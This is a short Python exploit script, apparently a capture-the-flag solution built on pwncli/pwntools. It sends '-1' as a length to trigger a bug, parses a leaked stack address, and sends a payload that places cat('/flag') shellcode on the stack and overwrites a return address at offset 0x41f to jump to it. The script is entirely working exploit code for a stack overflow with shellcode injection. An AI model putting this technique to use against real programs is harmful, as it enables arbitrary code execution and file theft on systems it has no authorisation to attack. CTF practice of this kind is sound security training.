#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']


p.sendlineafter("Be careful. How many chars you want to reapeat?\n", "-1")
m = p.recvline()
stack_addr = int16(m.split()[0].decode())
log_address("stack addr", stack_addr)

target_addr = stack_addr+3

payload = flat({
    3: asm(shellcraft.cat("/flag")),
    0x41f: target_addr
})
p.sendline(payload)



p.interactive()